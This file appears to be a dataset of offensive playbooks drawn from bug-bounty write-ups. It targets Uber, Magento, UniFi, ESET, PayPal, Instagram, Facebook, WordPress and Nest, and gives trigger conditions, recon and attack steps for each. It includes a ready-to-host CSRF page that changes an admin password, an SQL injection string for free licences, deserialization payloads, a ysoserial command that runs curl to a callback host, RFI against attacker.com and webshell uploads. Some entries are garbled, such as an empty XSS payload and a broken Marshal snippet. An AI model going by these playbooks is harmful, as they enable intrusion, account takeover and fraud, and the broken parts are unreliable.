Step 4: Immediately after the logout request, initiate a login request to `https://partners.uber.com/login/`. This step is crucial to prepare the application for the callback.

Step 5: The CSP policy will prevent the full logout on `login.uber.com`, maintaining the user's session on that domain. Subsequently, the attacker's code (which includes the OAuth callback redirection and the self-XSS payload) is injected.
Step 6: The attacker's injected code forces the user to be logged into the attacker's account on partners.uber.com, executing the self-XSS payload under the victim's session.

Step 7: While the attacker's payload is executing, the attacker's code proceeds to log the victim back into their own account. This ensures that the victim's session is restored, but the attacker's code has already had a chance to execute and potentially exfiltrate data or perform actions.
payloads_or_patterns: The self-XSS payload is executed within the context of the victim's session on partners.uber.com after being logged into the attacker's account.
tools_recommended: Burp Suite (for intercepting and analyzing HTTP requests and responses)
Custom HTML file hosting (e.g., GitHub Pages, Netlify) to deliver the exploit payload to the victim.
success_indicators: The victim user is redirected to the attacker's account on partners.uber.com.
The self-XSS payload executes (e.g., an alert box appears with `partners.uber.com`).
The victim user is subsequently logged back into their own account on partners.uber.com.
The attacker can potentially access sensitive user data or perform actions on behalf of the victim through the executed XSS payload.
failure_indicators: The CSP violation error message does not appear, indicating the CSP meta tag is not being honored or is incorrectly configured.
The user is fully logged out of both partners.uber.com and login.uber.com, indicating the logout CSRF mitigation was ineffective.
The self-XSS payload does not execute, suggesting it's not reflected or sanitized properly.
The OAuth callback still includes a `state` parameter, preventing the CSRF aspect of the attack.

playbooks.impact: The attacker can leverage a self-XSS vulnerability combined with CSRF flaws in the OAuth and logout functionalities to trick a victim into logging into the attacker's account on the Uber Partners portal. While the victim's session is being manipulated, the self-XSS payload executes within the victim's browser context. This allows the attacker to potentially steal session cookies, perform actions on behalf of the victim (e.g., modify profile details, view sensitive information), or redirect the victim to malicious sites, effectively turning a self-XSS into a stored or reflected XSS against other users.
playbooks.key_lesson: Always chain seemingly minor vulnerabilities, such as self-XSS and CSRF, to achieve a significant impact. Investigate OAuth flows for missing `state` parameters and test logout functionalities for CSRF susceptibility.

meta.title: Autoloaded File Inclusion in SOAP API (CVE-2015-6497)

trigger_conditions.when_to_apply: When Magento's SOAP API uses an autoloading mechanism that can be influenced by user-controlled input, allowing for arbitrary file inclusion.
prerequisites: SOAP API endpoint is accessible.
applicability_signals: Endpoints related to SOAP operations are found.
PHP __autoload() function or similar class loading mechanisms are in use and accept user-controlled input.
Responses indicate Magento CE is running.
skip_if: WAF blocks requests containing common LFI/RFI patterns.
SOAP API requires authentication that cannot be bypassed.

recon_steps: Step 1: Enumerate SOAP API endpoints using common Magento paths and tools like `dirbuster` or `gobuster`.
Step 2: Analyze SOAP API requests and responses to identify parameters that accept class names or class-related data.

Step 3: Inspect PHP code (if available) or use dynamic analysis to understand how class names are handled and if they are passed to autoloader functions like `__autoload()` or `class_exists()` without proper sanitization.
attack_steps: Step 1: Craft a SOAP request targeting an identified endpoint, providing a malicious string as a parameter that controls the class name.
Step 2: Use a Remote File Inclusion (RFI) payload to point to a remote server controlled by the attacker, hosting a PHP webshell.
Step 3: If RFI is blocked or ineffective, attempt Local File Inclusion (LFI) to read sensitive files like `/etc/passwd` or Magento configuration files.
Step 4: If a file is successfully included and executed (e.g., a webshell), attempt to achieve Remote Code Execution (RCE) by executing commands through the webshell.
tools_recommended: Burp Suite: For intercepting and modifying SOAP requests, identifying parameters, and staging payloads.
Custom PHP script: To host the webshell for RFI attacks.
Ncat/Netcat: To listen for incoming connections and serve files for RFI.
success_indicators: 200 OK response when including remote files with a webshell, followed by a successful callback to the attacker's server.
Successful retrieval of sensitive file contents (e.g., `/etc/passwd`, `local.xml`).
Execution of arbitrary commands via a webshell through the SOAP API.
failure_indicators: 400 Bad Request or 500 Internal Server Error responses for all crafted payloads indicate input sanitization or incorrect SOAP structure.
WAF blocking the request with a 403 Forbidden response.
No successful execution or file retrieval after multiple attempts indicates the autoloading mechanism is not vulnerable in the targeted way.

playbooks.impact: Remote Code Execution on the Magento web server, allowing an attacker to gain full control over the e-commerce platform, steal sensitive data (customer information, payment details), deface the website, and use the server for further malicious activities.
playbooks.key_lesson: Always investigate how user-controlled input is handled in PHP autoloading mechanisms, especially in API contexts, as it can lead to file inclusion vulnerabilities.

meta.title: Ubiquiti Bug Bounty: UniFi v3.2.10 Generic CSRF Protection Bypass

trigger_conditions.when_to_apply: When the target application's CSRF protection relies solely on checking the Referer header and does not validate it against the host, and when an attacker can trigger a request from a context where the Referer header can be stripped.
prerequisites: The target application must be vulnerable to CSRF by relying only on the Referer header for protection.
The attacker must be able to trick a victim user into clicking a crafted link or loading a malicious page.
applicability_signals: API endpoints that perform state-changing operations.
Responses to unauthorized requests include `api.err.LoginRequired`.
skip_if: CSRF protection involves other mechanisms like anti-CSRF tokens.
All requests to state-changing endpoints are blocked by a WAF.

recon_steps: Identify API endpoints that perform sensitive actions (e.g., user management, configuration changes).
Attempt to make requests to these endpoints with a manipulated Referer header (e.g., a different domain or an empty Referer) to observe the application's response.
attack_steps: Craft an HTML page containing JavaScript.
The JavaScript should dynamically create a form with the target action URL (e.g., `https://<TARGET_URL>:8443/api/s/default/cmd/sitemgr`).
Set the form's `enctype` attribute to `text/plain` to ensure the JSON payload is sent correctly.
Include a hidden input field where the `name` attribute is set to the JSON payload and the `value` attribute is empty.
Use an `<iframe>` with `src='about:blank'` to ensure the Referer header is stripped.
Use JavaScript (`top.frames[0].document.body.innerHTML` and `getElementById('csrf').submit()`) to populate the iframe and submit the form.
Host this HTML page on an attacker-controlled server and trick a victim into visiting it.
payloads_or_patterns: <html><head><script>function load() { var postdata = '<form id=csrf method=POST enctype=\'text/plain\' action=\'https://<TARGET_URL>:8443/api/s/default/cmd/sitemgr\'>' + '<input type=hidden name=\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22<NEW_PASSWORD>%22%2C%22email%22%3A%22<VICTIM_EMAIL>%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\' value=\'\' /></form>'; top.frames[0].document.body.innerHTML = postdata; top.frames[0].document.getElementById('csrf').submit(); }</script></head><body onload='load()'><iframe src='about:blank' id='noreferer'></iframe></body></html>
tools_recommended: Burp Suite (for crafting and hosting the malicious HTML page)
success_indicators: The target user's password is changed.
A new user is added to the UniFi system.
WLAN configurations are modified.
The API call returns a success status code (e.g., 200 OK) without an `api.err.LoginRequired` message.
failure_indicators: The request returns a `401 Unauthorized` or `403 Forbidden` status code with an `api.err.LoginRequired` message, indicating the Referer check is still in place or another protection mechanism is active. In this case, the exploit might not be directly applicable and alternative CSRF techniques should be explored.

playbooks.impact: An attacker can compromise the UniFi installation and connected devices by changing user passwords, adding new users, changing device usernames and passwords, or creating new WLAN configurations, leading to unauthorized access and control.
playbooks.key_lesson: Always implement robust CSRF protection beyond simple Referer header checks, such as using synchronized anti-CSRF tokens.

meta.title: A Hilarious ESET Broken Authentication Vulnerability (one click free purchase)

trigger_conditions.when_to_apply: When the target application exposes an activation or registration endpoint that takes a product key or serial number as a parameter and doesn't properly sanitize input.
prerequisites: Attacker can intercept and modify HTTP requests to the activation endpoint.
applicability_signals: The existence of an activation endpoint like `/me/activate/reg/` that accepts a 'serial' parameter.
Application responds to requests with various HTTP status codes (e.g., 200, 400) indicating processing of input.
skip_if: WAF blocks SQL injection payloads.
Activation endpoint requires prior authentication or session tokens.
All requests to the activation endpoint result in generic errors regardless of input.

recon_steps: Step 1: Identify activation or registration endpoints on the ESET domain.
Step 2: Analyze requests made during the product activation process to find vulnerable parameters.
attack_steps: Step 1: Send a POST request to `http://eu-eset.com/me/activate/reg/` with multipart/form-data.
Step 2: In the form data, set the 'serial' parameter to the SQL injection payload `' OR '''`.
Step 3: Submit other required form fields like 'country', 'firstname', 'lastname', 'company', 'email', 'phone' with arbitrary values.
Step 4: Observe the response for indicators of successful license generation.
tools_recommended: Burp Suite: To intercept, modify, and resend HTTP requests. Configure Burp to automatically repeat requests with different payloads for the 'serial' parameter.
success_indicators: Receiving a valid, year-long license key for ESET Nod32 Antivirus in the response or via email (though not explicitly stated in writeup, implied by 'free paid license').
Response indicates successful activation or license generation, even with a malformed 'serial' value.
failure_indicators: Receiving a 400 Bad Request or similar error indicating invalid serial format that doesn't lead to license generation.
No valid license is generated or provided.

playbooks.impact: Generation of millions of valid paid ESET Nod32 Antivirus licenses for free, bypassing purchase requirements and causing significant financial loss to ESET.
playbooks.key_lesson: Always perform SQL injection testing on input fields, especially those related to product keys, serial numbers, or identifiers, to prevent unauthorized license generation or data breaches.

meta.title: How I got access to millions of [redacted] accounts

trigger_conditions.when_to_apply: This technique is applicable when a server-side script on the target fetches and includes content from a user-controlled URL. The exact mechanism for this inclusion is not detailed in the writeup.
prerequisites: The target server must be vulnerable to Remote File Inclusion (RFI).
applicability_signals: A function or endpoint exists that dynamically loads external resources based on a provided URL parameter.
skip_if: The target server sanitizes or strictly validates all external URLs, preventing the inclusion of attacker-controlled content.

recon_steps: Step 1: Analyze the target application for any features that involve fetching external content via a URL. Look for parameters that accept URLs.
Step 2: If such parameters are found, attempt to confirm RFI by providing a URL pointing to a simple text file hosted on a server controlled by the attacker.
attack_steps: Step 1: Host a malicious PHP file on an attacker-controlled server. This file should contain code to capture sensitive information or perform other malicious actions.

Step 2: Submit a request to the target application with the vulnerable parameter set to the URL of the malicious PHP file on the attacker-controlled server. The exact endpoint and parameter name are not specified.
Step 3: Monitor the attacker-controlled server for incoming requests and data from the target server.
payloads_or_patterns: URL pointing to a malicious PHP file, e.g., http://attacker.com/malicious.txt (Note: The writeup implies a PHP file, so the extension might be .php or the server might interpret .txt as PHP)
tools_recommended: Attacker-controlled web server for hosting malicious payloads and logging requests.
success_indicators: The malicious PHP code is executed on the target server and sends data back to the attacker's server.
Observable data exfiltration or execution of commands on the target server.
failure_indicators: The target server returns an error indicating that the URL is invalid or cannot be accessed.
The target server fetches and displays the content of the malicious file as plain text instead of executing it.
A WAF blocks the request.

playbooks.impact: Gaining unauthorized access to sensitive data (millions of accounts), potentially leading to further compromise or data breaches.
playbooks.key_lesson: Always validate and sanitize all user-supplied URLs to prevent Remote File Inclusion vulnerabilities.

meta.title: Deserialization in Perl v5.8

tech_stack_fingerprints: Application uses Storable format for serialization
Response contains 'No STORABLE_thaw defined for objects of class ... (even after a " require ...; ")' error message

trigger_conditions.when_to_apply: When an application accepts serialized data (often Base64 encoded) in a parameter, and this data is processed by a Perl v5.8 application using the Storable module.
prerequisites: Attacker can control a serialized data parameter.
applicability_signals: Hidden form parameter containing Base64 encoded data with binary content.
Error message indicating 'No STORABLE_thaw defined for objects of class ... (even after a " require ...; ")'.
Use of Perl and Storable module for data serialization.
skip_if: No serialized data parameters are exposed.
The application is not using Perl or the Storable module.
Storable is configured to not use CODE reference serialization or load arbitrary modules.

recon_steps: Identify parameters containing Base64 encoded data. Analyze the decoded content for binary structures.
Attempt to corrupt the Base64 encoded data slightly (e.g., using Burp Intruder with character replacement) to trigger deserialization errors.
Observe error messages for indications of Perl and Storable usage, specifically the 'No STORABLE_thaw defined...' error.
attack_steps: Construct a malicious Storable payload. Start by trying to inject module names with executable commands using ';'.
Base64 encode the malicious payload.
Submit the Base64 encoded payload in the identified parameter (e.g., 'state').
Observe the response time. A delayed response indicates successful code execution.
If initial attempts fail, research specific Perl Storable RCE payloads and adapt them to the observed error messages and potential limitations.
payloads_or_patterns: Base64 encoded string representing a malicious Perl Storable object. Example: 'BQgTAg5QT1NJWDtzbGVlcCg1KQEx' (which decodes to POSIX;sleep(5))
tools_recommended: Burp Suite Intruder: For fuzzing Base64 encoded parameters.
Perl script: To craft and encode malicious Storable payloads.
Online Base64 decoder/encoder.
success_indicators: Delayed HTTP response from the server, indicating that a command like 'sleep(5)' has been executed.
Unexpected application behavior or error messages consistent with remote code execution.
failure_indicators: Immediate response without any delay.
Generic error messages not related to Storable deserialization.
4xx or 5xx errors without specific indicators of code execution.
If the server returns an error indicating that the serialized data is not of the expected format, try a different serialization format or a simpler payload.

playbooks.impact: Remote Code Execution (RCE) on the server, allowing an attacker to run arbitrary commands, potentially leading to full system compromise.
playbooks.key_lesson: When encountering parameters that accept Base64 encoded data and trigger Perl Storable deserialization errors, investigate the possibility of injecting malicious module names or objects to achieve RCE, paying close attention to error messages for clues about the deserialization process.

meta.title: XSS without HTML: Client-Side Template Injection with AngularJS

affected_components: Any web page that uses AngularJS and directly embeds user-controlled input into templates without proper sanitization.

trigger_conditions.when_to_apply: When a web application uses AngularJS and directly embeds user-provided input into its HTML templates, especially within Angular expressions {{ }}.
prerequisites: The target web application must be using AngularJS.
User input must be reflected directly into an Angular template, allowing for the injection of Angular expressions.
applicability_signals: User input is reflected within double curly braces {{ }} in the HTML source.
The HTML source contains 'ng-app' directive.
The application dynamically embeds user input into a page that is rendered by AngularJS.
skip_if: User input is properly sanitized or HTML-encoded before being embedded in the template.
AngularJS expressions are not evaluated due to the input not being within {{ }}.

recon_steps: Step 1: Inspect HTML source of pages that render user-supplied data to identify AngularJS usage (e.g., presence of 'ng-app' or Angular JS script includes).
Step 2: Identify endpoints or parameters where user input is reflected within the HTML content, specifically looking for its presence inside double curly braces {{ }}.
attack_steps: Step 1: Inject simple Angular expressions like {{ 1+1 }} into parameters or input fields that are reflected in the HTML source.
Step 2: Observe if the expression is evaluated and the result is rendered (e.g., '2' is displayed). This confirms Angular Template Injection.
Step 3: Craft a payload using a known Angular sandbox escape (as described in the writeup) to execute arbitrary JavaScript. The specific sandbox escape payload will depend on the AngularJS version.
Step 4: Inject the crafted sandbox escape payload into the vulnerable input parameter.
Step 5: Monitor for signs of JavaScript execution, such as `alert()` popups or network requests to an external server (e.g., Burp Collaborator).
tools_recommended: Burp Suite: To intercept requests, modify parameters, and observe responses.
Browser Developer Tools: To inspect HTML source, DOM, and JavaScript console.
success_indicators: Execution of JavaScript code, such as an `alert()` box appearing.
A network callback to an attacker-controlled server (e.g., Burp Collaborator) from the injected JavaScript.
failure_indicators: The injected expression is not evaluated, and is rendered as plain text (e.g., '{{ 1+1 }}' appears literally). This indicates the input is not part of an Angular template, or expressions are disabled.

A sandbox escape payload fails to execute JavaScript, but the expression is evaluated. This may indicate the sandbox is still too restrictive or the escape is not applicable to the specific Angular version.
A 403 Forbidden or similar error is returned, suggesting a Web Application Firewall (WAF) is blocking the payload.

playbooks.impact: Execution of arbitrary JavaScript in the context of the victim's browser, leading to Cross-Site Scripting (XSS) attacks. This can result in session hijacking, data theft, unauthorized actions on behalf of the user, and further exploitation of the application.
playbooks.key_lesson: Always sanitize user input before embedding it into client-side templates, especially when using frameworks like AngularJS that evaluate expressions within double curly braces. Be aware of sandbox bypass techniques for Angular template injection.

meta.title: An XSS on Facebook via PNGs & Wonky Content Types

trigger_conditions.when_to_apply: This technique is applicable when the target allows authenticated users to upload images and does not properly sanitize or validate the content type of uploaded files, or if the CDN serving these files is susceptible to MIME sniffing.
prerequisites: Authenticated user account on Facebook.
applicability_signals: Ability to upload images to Facebook.
Observation that uploaded image files (e.g., .srt, advert images) are served from CDN domains like fbcdn.net or akamaihd.net.
Absence of `X-Content-Type-Options: nosniff` header on CDN-served content.
skip_if: Content security policy (CSP) that strictly prohibits inline scripts or scripts from untrusted origins.
Server-side filtering that detects and blocks malicious PNG IDAT chunk content.

recon_steps: Step 1: Upload various file types (e.g., .txt, .html, .srt) and observe the content types and URL structures of the served assets on Facebook's CDN.
Step 2: Attempt to upload a crafted PNG file containing malicious JavaScript within its IDAT chunk to Facebook's image upload feature.

Step 3: Analyze the response headers and content of the uploaded image to confirm if the PNG IDAT data is preserved and if the content type is served as text/html or can be interpreted as such by the browser.
attack_steps: Step 1: Craft a PNG file where the IDAT chunk contains compressed DEFLATE data that decompresses to a JavaScript payload (e.g., `<SCRIPT src=//FNT.PE></SCRIPT>`).
Step 2: Upload the crafted PNG file to Facebook via the image upload feature.
Step 3: Obtain the URL of the uploaded image from Facebook's CDN.
Step 4: Access the image URL in a browser. If successful, the browser will attempt to interpret the PNG data as HTML, executing the embedded JavaScript.
Step 5: For this specific payload, observe the execution of the script from `//FNT.PE`.
payloads_or_patterns: Crafted PNG file with JavaScript payload (e.g., `<SCRIPT src=//FNT.PE></SCRIPT>`) embedded in the IDAT chunk.
Example of the DEFLATE compressed data for the payload: `7ff399281922111510691928276e6e5c1e151e51241f576e69b16375535b6f`
tools_recommended: Custom Python script for brute-forcing DEFLATE compressed data to embed desired strings in PNG IDAT chunks.
Hex editor (e.g., hexdump) to inspect PNG file structure.
Burp Suite to intercept and analyze HTTP requests/responses, and potentially to host a malicious JS file.
Image manipulation libraries (e.g., Pillow in Python) to help craft PNG files.
success_indicators: The browser renders HTML or executes JavaScript from the uploaded image URL, indicated by an alert box or the loading of an external script.
The `Content-Type` header of the served image response is `text/html`, or the browser performs MIME sniffing to treat it as HTML.
Network requests to the embedded script URL (e.g., `//FNT.PE`) are observed in the browser's developer tools.
failure_indicators: Facebook rejects the uploaded PNG file.
The uploaded image is served with a `Content-Type: image/png` and the browser does not interpret it as HTML.
The embedded JavaScript is not executed.
The PNG IDAT chunk data is stripped or corrupted during upload or serving.

playbooks.impact: An attacker can execute arbitrary JavaScript in the context of the victim's browser session on Facebook. This can lead to session hijacking, credential theft, account takeovers, or performing actions on behalf of the user.
playbooks.key_lesson: When uploading user-controlled content (like images) to a web application, always ensure that the server and CDN properly sanitize and validate the content type, and enforce `X-Content-Type-Options: nosniff` to prevent MIME-sniffing based attacks.

meta.title: [manager.paypal.com] Remote Code Execution Vulnerability

tech_stack_fingerprints: POST form parameter 'oldFormData' containing Base64 encoded Java serialized object

trigger_conditions.when_to_apply: When a web application accepts Base64 encoded Java serialized objects as POST parameters without proper validation, allowing for arbitrary class deserialization.
prerequisites: The target must accept Base64 encoded Java serialized objects via POST requests.
The target must have vulnerable classes in its classpath that can be exploited via deserialization (e.g., Commons Collections).
The attacker must be able to send POST requests to the target.
applicability_signals: Observation of a POST parameter named 'oldFormData' or similar, which, when decoded, appears to be a Base64 encoded complex object.
Absence of digital signatures or integrity checks on serialized object data.
skip_if: All POST requests are rejected with errors related to malformed data when sending serialized objects.
Input validation explicitly blocks or sanitizes serialized object data.

recon_steps: Identify POST endpoints on manager.paypal.com.
Observe POST parameters for any that appear to hold complex serialized data, especially those that are Base64 encoded.
attack_steps: Step 1: Download and use the `ysoserial` tool to generate a Java deserialization payload targeting a command execution gadget (e.g., `CommonsCollections4`). The payload should be configured to execute a command like `curl x.s.artsploit.com/paypal` or `cat /etc/passwd`.
Step 2: Base64 encode the generated payload.
Step 3: Send a POST request to a vulnerable endpoint on manager.paypal.com, including the Base64 encoded payload in the 'oldFormData' parameter.

Step 4: Monitor a controlled server (e.g., Burp Collaborator, an Nginx server) for incoming DNS or HTTP requests originating from the target's network, or look for the output of commands like `cat /etc/passwd` in the response or subsequent callbacks.
payloads_or_patterns: Use ysoserial to generate payloads, e.g., `java -jar ysoserial.jar CommonsCollections4 'curl <YOUR_COLLABORATOR_URL_OR_IP>' > payload.ser` then Base64 encode payload.ser.
tools_recommended: ysoserial: For generating Java deserialization payloads.
Burp Suite: To intercept and modify POST requests, and to host a listener (Burp Collaborator) for callbacks.
success_indicators: An incoming request to the attacker's controlled server from the target's IP address, indicating command execution (e.g., DNS lookup, HTTP request to attacker's server).
The response from the target server contains the output of the executed command (e.g., the content of /etc/passwd).
failure_indicators: The target server returns a 400 or 500 error indicating malformed input, or a specific error message related to deserialization failures. → Investigate if a different gadget chain or serialization class is available, or if the parameter name is different.

No callbacks are received and no command output is visible in the response. → Verify the payload generation and encoding, check if other parameters are vulnerable, or if deserialization is disabled for this specific endpoint.

playbooks.impact: Remote Code Execution (RCE) on PayPal web servers, allowing attackers to execute arbitrary OS commands, access production databases, and potentially gain a persistent back door.
playbooks.key_lesson: Always validate and sanitize deserialized object input, especially when it comes from untrusted sources, to prevent Java deserialization vulnerabilities like RCE.

meta.title: Instagram's Million Dollar Bug

trigger_conditions.when_to_apply: When a Ruby on Rails application is found to be running and potentially exposes sensitive configuration files like `secret_token.rb` or a hardcoded `secret_token`.
prerequisites: The target server is running a Ruby on Rails application.
The target application's source code or configuration files are accessible, or a hardcoded secret token can be identified.
applicability_signals: The presence of a Ruby on Rails application at a known endpoint.
Information leak of `secret_token.rb` or a similar file.
A hardcoded `secret_token` found in source code analysis or configuration files.
skip_if: The server does not appear to be running a Ruby on Rails application.
No hardcoded secret token can be identified.
The application uses a dynamically generated or securely managed secret token.

recon_steps: Step 1: Access https://sensu.instagram.com to confirm it's a Ruby on Rails application.
Step 2: Search publicly available code repositories (e.g., GitHub) for 'Sensu-Admin' and 'secret_token.rb' to find examples of how the secret token is stored or handled.
Step 3: If the application is self-hosted and the source code is not public, attempt to find any exposed configuration files or source code snippets that might reveal the secret token.
attack_steps: Step 1: Obtain the `secret_token` from the identified `secret_token.rb` file or source code.
Step 2: Configure a local Rails instance with the same `secret_token`.
Step 3: Craft a malicious serialized Ruby object that, when deserialized by Rails, executes arbitrary code (e.g., using Ruby's YAML or Marshal deserialization vulnerabilities).
Step 4: Serialize the malicious object using the obtained `secret_token` to create a spoofed session cookie.
Step 5: Send a request to the target application with the spoofed session cookie in the `Cookie` header.
Step 6: Observe the server's response for signs of code execution.
payloads_or_patterns: Example payload structure for serialized Ruby object (specific payload depends on the desired RCE):
# Example using Marshal.load for potential RCE

payload = Marshal.load("---
 " + '`touch /tmp/pwned`') # Replace with actual RCE payload
# This is a conceptual representation, actual cookie generation requires specific Rails session store implementation knowledge.
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially to add the crafted session cookie.
Ruby environment: To test and generate malicious serialized Ruby objects.
GitHub/Source code analysis tools: To find the `secret_token`.
success_indicators: Arbitrary command execution on the server, e.g., creating a file (`/tmp/pwned`), making an outbound network connection, or obtaining shell access.
Response indicating successful code execution, such as specific output from the executed command.
failure_indicators: The application rejects the spoofed session cookie with an error (e.g., `Invalid Authenticity Token` or similar).
The crafted payload does not result in code execution or an error indicating a deserialization issue.
Suggestion: If deserialization vulnerabilities are mitigated, explore other potential weaknesses in the Rails application or its configuration.

playbooks.impact: Gaining arbitrary code execution on the server allows an attacker to access sensitive data (SSL certs, source code, photos), control the server, and potentially pivot to other systems within the network.
playbooks.key_lesson: Always scrutinize publicly exposed configuration files and source code for hardcoded secrets like `secret_token`, as these can lead to session hijacking and remote code execution in Ruby on Rails applications.

meta.title: Local File XSS Vulnerability in Wordpress.com (Write Up)

trigger_conditions.when_to_apply: When an authenticated user is writing a blog post and can manipulate content being inserted into the editor, potentially via drag-and-drop of local files.
prerequisites: User must be authenticated to WordPress.com.
applicability_signals: Ability to drag and drop local HTML files into the blog post editor.
skip_if: The blog post editor does not allow drag-and-drop of local files, or sanitizes local file content before rendering.

recon_steps: Step 1: Log in to WordPress.com with an authenticated user account.
Step 2: Navigate to the blog post editor and observe the available content manipulation features, specifically looking for drag-and-drop functionality.
attack_steps: Step 1: Create a local HTML file containing an XSS payload, e.g., ``.
Step 2: Drag and drop this crafted HTML file into the WordPress.com blog post editor.
Step 3: Observe if the XSS payload is rendered or executed within the editor's preview or when the post is saved/viewed.
tools_recommended: Text editor (e.g., Sublime Text, VS Code) for crafting HTML payload.
Browser for testing.
success_indicators: The JavaScript `alert(document.domain)` executes within the context of the WordPress.com blog post editor or the rendered blog post.
An HTTP request is observed from the victim's browser to an attacker-controlled server after the XSS is triggered.
failure_indicators: The XSS payload is stripped or neutralized by the editor, resulting in no execution. In this case, the attacker might try different XSS payloads or investigate if the drag-and-drop mechanism itself has other vulnerabilities.
A 403 Forbidden or similar error when trying to upload or render the crafted file, indicating input validation or restrictions.

playbooks.impact: Cross-Site Scripting (XSS) vulnerability that could allow an attacker to execute arbitrary JavaScript in the context of the victim's browser session on WordPress.com. This could lead to session hijacking, defacement of the blog, redirection to malicious sites, or other attacks.
playbooks.key_lesson: When a web application allows users to import or manipulate local files, always test for XSS vulnerabilities by crafting malicious HTML or JavaScript files and observing how the application processes them.

meta.title: Arbitrary File Upload Vulnerability in Google Nest

trigger_conditions.when_to_apply: When a web application allows file uploads without proper validation of file types or content, potentially leading to the execution of uploaded code or scripts.
prerequisites: Attacker has an authenticated account on the target application.
applicability_signals: Presence of a file upload feature.
skip_if: File uploads are strictly validated by file extension, MIME type, and content.

recon_steps: Identify any file upload functionalities within the Google Nest web application.
Analyze the upload process for vulnerabilities, such as lack of file type validation, insecure file naming conventions, or insufficient content sanitization.
attack_steps: Step 1: Craft a malicious file (e.g., a PHP shell with XSS payload) that bypasses any potential file type restrictions. The writeup mentions uploading a '.php' shell.
Step 2: Upload the crafted malicious file through the identified file upload functionality.

Step 3: Access the uploaded file via its URL or through the application's interface to trigger the payload. If the upload is successful and the file is stored in an accessible location, navigating to its URL will execute the stored XSS payload.
tools_recommended: Burp Suite: To intercept and modify upload requests, and to analyze responses for file storage locations.
A web server to host malicious files or to receive callbacks if performing blind SSRF or command injection.
success_indicators: Successful upload of a malicious file (e.g., .php shell).
Execution of stored XSS payload when accessing the uploaded file.
